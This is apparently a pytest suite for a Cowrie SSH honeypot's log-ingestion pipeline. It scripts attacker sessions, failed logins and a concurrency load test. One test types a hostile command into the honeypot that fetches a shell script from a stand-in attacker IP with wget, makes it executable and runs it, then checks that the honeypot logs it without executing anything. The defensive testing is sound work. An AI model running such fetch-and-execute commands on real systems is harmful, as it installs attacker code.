"""End-to-end: a real Cowrie process, a scripted attacker, the ingester.

Needs Cowrie installed and VULNMAZE_TEST_DSN. Runs in CI.
"""

from __future__ import annotations

import os
import stat
import time
from concurrent.futures import ThreadPoolExecutor

import pytest
from _support import failed_login, ssh_session

from vulnmaze.ingest.pipeline import Ingestor
from vulnmaze.ingest.tailer import FileTailer

pytestmark = [pytest.mark.cowrie, pytest.mark.db]

COMMANDS = ["uname -a", "whoami", "id", "pwd", "ls /tmp", "cat /etc/hostname",
            "ps aux", "free -m", "uptime", "df -h"]


def _drain(tailer, ingestor, conn):
    total = 0
    while lines := tailer.poll():
        with conn.transaction():
            total += ingestor.ingest_lines(lines)
    return total


def test_scripted_session_fully_logged(cowrie_server, pg, deid):
    tailer = FileTailer(str(cowrie_server.json_log))
    ing = Ingestor(pg, deid)
    _drain(tailer, ing, pg)
    before = pg.execute("SELECT count(DISTINCT session) FROM events").fetchone()[0]

    ssh_session(cowrie_server.host, cowrie_server.port, COMMANDS + ["exit"])
    time.sleep(1.0)
    _drain(tailer, ing, pg)

    sessions = pg.execute("SELECT DISTINCT session FROM events").fetchall()
    assert len(sessions) == before + 1
    rows = pg.execute(
        """SELECT eventid, input FROM events WHERE session = (
               SELECT session FROM events WHERE eventid='cowrie.command.input' AND input='df -h'
               ORDER BY ts DESC LIMIT 1) ORDER BY ts, id"""
    ).fetchall()
    eids = [r[0] for r in rows]
    for needed in ("cowrie.session.connect", "cowrie.login.success", "cowrie.session.closed"):
        assert needed in eids
    typed = [r[1] for r in rows if r[0] == "cowrie.command.input"]
    assert typed == COMMANDS + ["exit"]


def test_download_logged_not_executed(cowrie_server, pg, deid):
    ssh_session(cowrie_server.host, cowrie_server.port,
                ["cd /tmp; wget http://198.51.100.23/bins/x86.sh; chmod +x x86.sh; ./x86.sh", "exit"])
    time.sleep(1.0)
    tailer = FileTailer(str(cowrie_server.json_log))
    ing = Ingestor(pg, deid)
    _drain(tailer, ing, pg)
    urls = pg.execute(
        "SELECT digest->'urls' FROM session_digests WHERE digest->'urls' @> '[\"http://198.51.100.23/bins/x86.sh\"]'"
    ).fetchall()
    assert urls, "download URL missing from the session digest"
    downloads = cowrie_server.workdir / "var/lib/cowrie/downloads"
    for f in downloads.iterdir():
        assert not f.stat().st_mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH), f"{f} is executable"


def test_failed_login_recorded(cowrie_server, pg, deid):
    failed_login(cowrie_server.host, cowrie_server.port, "root", "root")
    time.sleep(0.5)
    tailer = FileTailer(str(cowrie_server.json_log))
    _drain(tailer, Ingestor(pg, deid), pg)
    n = pg.execute("SELECT count(*) FROM events WHERE eventid='cowrie.login.failed'").fetchone()[0]
    assert n >= 1


@pytest.mark.slow
def test_concurrent_sessions_no_dropped_events(cowrie_server, pg, deid):
    n_sessions = int(os.environ.get("VULNMAZE_LOAD_SESSIONS", "100"))
    lag_budget_s = float(os.environ.get("VULNMAZE_LAG_BUDGET_S", "5"))
    tailer = FileTailer(str(cowrie_server.json_log))
    ing = Ingestor(pg, deid)
    _drain(tailer, ing, pg)
    start_count = pg.execute("SELECT count(*) FROM session_digests WHERE closed").fetchone()[0]

    def one(i):
        ssh_session(cowrie_server.host, cowrie_server.port, [f"echo load-{i}", "exit"])

    with ThreadPoolExecutor(max_workers=min(50, n_sessions)) as pool:
        list(pool.map(one, range(n_sessions)))
    finished = time.time()
    time.sleep(1.0)                   # let Cowrie flush the last session.closed events
    _drain(tailer, ing, pg)
    lag = time.time() - finished
    closed = pg.execute("SELECT count(*) FROM session_digests WHERE closed").fetchone()[0] - start_count
    echoed = pg.execute("SELECT count(*) FROM events WHERE eventid='cowrie.command.input' AND input LIKE 'echo load-%%'").fetchone()[0]
    assert echoed == n_sessions
    assert closed == n_sessions
    assert lag < lag_budget_s, f"ingestion lag {lag:.1f}s"
